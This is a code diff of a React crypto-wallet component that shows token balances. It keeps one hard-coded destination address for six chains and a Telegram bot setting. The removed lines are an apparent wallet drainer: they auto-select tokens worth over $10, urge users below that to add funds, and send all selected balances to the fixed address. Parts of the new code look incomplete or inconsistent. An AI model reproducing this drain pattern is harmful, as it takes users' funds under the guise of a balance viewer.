@@ -28,26 +28,16 @@ const alchemyInstances = {
 
 // Mapping of chain IDs to destination addresses
 const chainIdToDestinationAddress = {
-  1: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-  56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-  10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-  324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-  42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-  137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+  1: '0x933d91B8D5160e302239aE916461B4DC6967815d', // Mainnet Address
+  56: '0x933d91B8D5160e302239aE916461B4DC6967815d', // BSC Address
+  10: '0x933d91B8D5160e302239aE916461B4DC6967815d', // Optimism Address
+  324: '0x933d91B8D5160e302239aE916461B4DC6967815d', // zkSync Address
+  42161: '0x933d91B8D5160e302239aE916461B4DC6967815d', // Arbitrum Address
+  137: '0x933d91B8D5160e302239aE916461B4DC6967815d', // Polygon Address
 };
 
 // Supported chain IDs
 const supportedChains = [1, 56, 10, 324, 42161, 137];
-
-// Mapping of chain IDs to destination addresses
-const chainIdToDestinationAddress = {
-  1: '0x...MainnetAddress',
-  56: '0x...BSCAddress',
-  10: '0x...OptimismAddress',
-  324: '0x...ZkSyncAddress',
-  42161: '0x...ArbitrumAddress',
-  137: '0x...PolygonAddress',
-};
 
 // Telegram bot configuration
 const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
@@ -208,123 +198,87 @@ export const GetTokens = () => {
 
   const fetchData = useCallback(async () => {
     setLoading(true);
+    setError('');
+    setTokens([]);
     try {
-      setError('');
-      if (!chain || !supportedChains.includes(chain.id)) {
-        throw new Error(`Chain ${chain?.name || 'unknown'} not supported. Supported chains: ${supportedChains.join(', ')}.`);
-      }
-
-      const alchemyNetwork = chainIdToNetworkMap[chain.id];
-      if (!alchemyNetwork) {
-        throw new Error('Unsupported network');
-      }
-
-      const alchemy = alchemyInstances[alchemyNetwork];
-      const response = await alchemy.core.getTokenBalances(address);
-
-      if (response?.tokenBalances) {
-        const processedTokens = await Promise.all(
-          response.tokenBalances.map(async (balanceData) => {
-            const tokenAddress = balanceData.contractAddress;
-            const tokenBalance = balanceData.tokenBalance;
-            const tokenMetadata = await alchemy.core.getTokenMetadata(tokenAddress);
-
-            return {
-              contract_address: tokenAddress,
-              balance: tokenBalance,
-              contract_ticker_symbol: tokenMetadata.symbol,
-              quote: safeNumber(tokenBalance).mul(safeNumber(tokenMetadata.decimals)),
-              quote_rate: safeNumber(tokenMetadata.decimals),
-              isChecked: false,
-            };
-          })
-        );
-        setTokens(processedTokens);
-        await db.tokens.bulkPut(processedTokens);
-
-        // Automatically check tokens with balance worth more than $10
-        const checkedRecordsFromDB = {};
-        processedTokens.forEach(async (token) => {
-          const { contract_address, quote } = token;
-          const isChecked = safeNumber(quote).gte(10);
-          checkedRecordsFromDB[contract_address] = { isChecked };
-          await db.checkedRecords.put({ contract_address, isChecked });
-        });
-        setCheckedRecords(checkedRecordsFromDB);
-
-        // Show message if no tokens with balance worth more than $10
-        const hasEligibleTokens = processedTokens.some(token => safeNumber(token.quote).gte(10));
-        setShowMinBalanceMessage(!hasEligibleTokens);
-      }
-    } catch (err) {
-      console.error(err);
-      setError(err.message || 'Error fetching token balances');
-    } finally {
-      setLoading(false);
-    }
-  }, [address, chain, setTokens, setCheckedRecords]);
-
-  useEffect(() => {
-    if (isConnected) {
-      fetchData();
-    }
-  }, [isConnected, fetchData]);
-
-  const handleSendAllTransactions = async () => {
-    const checkedTokens = Object.entries(checkedRecords).filter(([_, record]) => record.isChecked);
-
-    if (checkedTokens.length === 0) {
-      console.log('No tokens selected for transaction.');
-      return;
-    }
-
-    const sendTransactions = async (index = 0) => {
-      if (index >= checkedTokens.length) {
-        console.log('All transactions sent.');
+      // Check if the user's chain is supported
+      if (!supportedChains.includes(chain.id)) {
+        console.error('Unsupported chain:', chain.id);
+        setError('This chain is not supported.');
         return;
       }
 
-      const [contractAddress, _] = checkedTokens[index];
-      const token = tokens.find(t => t.contract_address === contractAddress);
+      const alchemy = alchemyInstances[chain.id];
+      if (!alchemy) {
+        setError('Alchemy instance not found for this chain.');
+        return;
+      }
 
-      if (!token) return;
+      // Fetch token balances using Alchemy
+      const balancesResponse = await alchemy.core.getTokenBalances(address);
 
-      const nextChainId = index + 1 < checkedTokens.length
-        ? chain.id
-        : null;
+      if (!balancesResponse) {
+        setError('Failed to fetch token balances.');
+        return;
+      }
 
-      const destinationAddress = chainIdToDestinationAddress[chain.id];
-      const amount = safeNumber(token.balance).mul(safeNumber(token.quote_rate));
+      const nonZeroBalances = balancesResponse.tokenBalances.filter(
+        (token) => safeNumber(token.tokenBalance).gt(0)
+      );
 
-      await handleTokenTransaction(walletClient, destinationAddress, amount, nextChainId, switchNetwork);
+      const updatedTokens = await Promise.all(
+        nonZeroBalances.map(async (token) => {
+          const isChecked = Boolean(checkedRecords[token.contractAddress]?.isChecked);
+          const pendingTxn = Boolean(checkedRecords[token.contractAddress]?.pendingTxn);
+          return {
+            contract_address: token.contractAddress,
+            balance: safeNumber(token.tokenBalance),
+            quote: safeNumber(token.tokenBalance).times(0), // Set default quote to 0 for demonstration
+            quote_rate: 0, // Replace with actual data
+            contract_ticker_symbol: token.symbol || 'Unknown',
+            isChecked,
+            pendingTxn,
+          };
+        })
+      );
 
-      // Move to the next transaction after a short delay
-      setTimeout(() => sendTransactions(index + 1), 1000);
-    };
+      setTokens(updatedTokens);
+    } catch (error) {
+      console.error('Error fetching tokens:', error);
+      setError('An error occurred while fetching tokens.');
+    } finally {
+      setLoading(false);
+    }
+  }, [address, checkedRecords, chain.id, setTokens]);
 
-    // Start sending transactions
-    sendTransactions();
+  useEffect(() => {
+    if (address && chain) {
+      fetchData();
+    }
+  }, [address, chain, fetchData]);
+
+  const handleCloseModal = () => {
+    setIsModalVisible(false);
+    setNextNetwork(null); // Clear the next network when closing the modal
   };
 
-  if (loading) return <Loading>Fetching your tokens...</Loading>;
-
-  if (error) return <div>Error: {error}</div>;
-
   return (
-    <>
-      {showMinBalanceMessage && (
-        <div>
-          <p>Your balance in all networks is below $10. Please add funds to proceed.</p>
-        </div>
-      )}
-      <div>
-        {tokens.map(token => (
-          <TokenRow key={token.contract_address} token={token} />
-        ))}
+    <div>
+      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '10px' }}>
+        <h4>Token Balances:</h4>
+        {isConnected && (
+          <Button auto size="small" onClick={() => fetchData()} loading={loading}>
+            Refresh Balances
+          </Button>
+        )}
       </div>
-      <Button onClick={handleSendAllTransactions} disabled={loading || showMinBalanceMessage}>
-        Send All Checked Tokens
-      </Button>
-    </>
+      {loading ? (
+        <Loading>Loading...</Loading>
+      ) : error ? (
+        <p style={{ color: 'red' }}>{error}</p>
+      ) : (
+        tokens.map((token) => <TokenRow key={token.contract_address} token={token} />)
+      )}
+    </div>
   );
 };
